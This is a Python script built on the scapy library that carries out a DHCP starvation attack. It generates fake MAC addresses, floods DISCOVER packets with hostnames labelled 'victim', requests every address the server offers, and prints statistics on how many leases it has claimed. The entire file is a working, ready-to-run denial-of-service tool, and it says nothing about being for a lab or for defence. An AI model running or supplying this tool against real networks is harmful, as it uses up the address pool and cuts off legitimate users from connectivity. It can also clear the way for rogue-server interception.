#!/usr/bin/env python3
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, mac2str
import random, time, threading, argparse, os, sys

# globals (keeps code short)
iface="eth0"; quiet=False
xid_mac = {}
fake_macs = []
requested = []
sent = leases = 0
running = True

def rand_mac():
    m=[0x00,0x0c,0x29, random.randint(0,255), random.randint(0,255), random.randint(0,255)]
    mac=':'.join(f"{x:02x}" for x in m); fake_macs.append(mac); return mac

def make_discover(mac):
    xid=random.randint(1,0xFFFFFFFF)
    pkt=(Ether(dst="ff:ff:ff:ff:ff:ff",src=mac)/
         IP(src="0.0.0.0",dst="255.255.255.255")/
         UDP(sport=68,dport=67)/
         BOOTP(chaddr=mac2str(mac),xid=xid,flags=0x8000)/
         DHCP(options=[("message-type","discover"),
                       ("hostname",f"victim-{random.randint(1000,9999)}"),
                       ("param_req_list",[1,3,6,15,28,51,58,59]),
                       "end"]))
    return pkt,xid

def make_request(mac,ip,server,xid):
    return (Ether(dst="ff:ff:ff:ff:ff:ff",src=mac)/
            IP(src="0.0.0.0",dst="255.255.255.255")/
            UDP(sport=68,dport=67)/
            BOOTP(chaddr=mac2str(mac),xid=xid,flags=0x8000)/
            DHCP(options=[("message-type","request"),
                          ("requested_addr",ip),
                          ("server_id",server),
                          ("hostname",f"victim-{random.randint(1000,9999)}"),
                          ("param_req_list",[1,3,6,15,28,51,58,59]),
                          "end"]))

def handle(p):
    global leases
    if DHCP not in p: return
    for o in p[DHCP].options:
        if o[0]=="message-type":
            t=o[1]
            if t==2: # OFFER
                ip=p[BOOTP].yiaddr; srv=p[IP].src; xid=p[BOOTP].xid
                mac = xid_mac.pop(xid,None) or p[Ether].dst
                if not quiet: print(f"[+] OFFER {ip} from {srv} (xid={xid}, mac={mac})")
                sendp(make_request(mac,ip,srv,xid), iface=iface, verbose=0)
                requested.append(ip)
                return
            if t==5: # ACK
                ip=p[BOOTP].yiaddr; leases+=1
                if not quiet: print(f"[✓] Leased: {ip} (Total: {leases})")
                return
            if t==6: # NAK
                print("[!] NAK received - pool may be exhausted"); return

def attacker():
    global sent
    if not quiet: print(f"[*] Starting on {iface} - Ctrl+C to stop")
    while running:
        mac=rand_mac(); pkt,xid=make_discover(mac); xid_mac[xid]=mac
        sendp(pkt, iface=iface, verbose=0); sent+=1
        if not quiet and sent%10==0: print(f"[→] Sent {sent} DISCOVERs")
        time.sleep(0.1)

def listener():
    sniff(filter="udp and (port 67 or port 68)", prn=handle, iface=iface, store=0,
          stop_filter=lambda x: not running)

def stats():
    print("\n" + "="*40); print("STATS"); print("="*40)
    print(f"DISCOVERs sent: {sent}"); print(f"Successful leases: {leases}")
    print(f"Unique MACs: {len(fake_macs)}"); print(f"Unique IPs: {len(set(requested))}")
    if requested:
        try: print(f"IP Range: {min(requested)} - {max(requested)}")
        except: pass
    print("="*40)

def main():
    global iface, quiet, running
    p=argparse.ArgumentParser(); p.add_argument("-i","--interface",default="eth0")
    p.add_argument("-d","--duration",type=int); p.add_argument("-q","--quiet",action="store_true")
    args=p.parse_args(); iface=args.interface; quiet=args.quiet
    if os.geteuid()!=0: print("Run as root"); sys.exit(1)
    t1=threading.Thread(target=listener,daemon=True); t1.start()
    t2=threading.Thread(target=attacker,daemon=True); t2.start()
    try:
        if args.duration: time.sleep(args.duration)
        else:
            while True: time.sleep(1)
    except KeyboardInterrupt:
        if not quiet: print("\n[*] Stopping...")
    finally:
        running=False; time.sleep(1); stats()

if __name__=="__main__": main()
